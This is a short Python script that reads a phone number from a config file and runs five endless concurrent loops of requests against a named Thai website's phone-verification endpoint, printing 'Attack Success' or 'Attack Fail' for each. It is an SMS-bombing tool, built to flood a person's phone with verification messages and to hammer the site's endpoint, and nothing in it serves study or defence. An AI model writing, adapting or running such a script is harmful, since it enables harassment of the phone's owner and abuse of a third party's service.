import asyncio
import aiohttp


with open("config.txt") as file:
    phone = file.read().strip()

phone = ''.join(filter(str.isdigit, phone))


async def make_request(session, url):
    async with session.head(url) as response:
        if response.status == 200:
            print("Attack Success Status API : ", response.status)
        else:
            print("Attack Fail Status API : ", response.status)

async def loop_request(session, url):
    while True:
        await make_request(session, url)

async def main():
    url = f"https://hdmall.co.th/phone_verifications?mobile={phone}"
    async with aiohttp.ClientSession() as session:
    	coroutines = [loop_request(session, url) for _ in range(5)]
    	await asyncio.gather(*coroutines)



if __name__ == "__main__":
    asyncio.run(main())
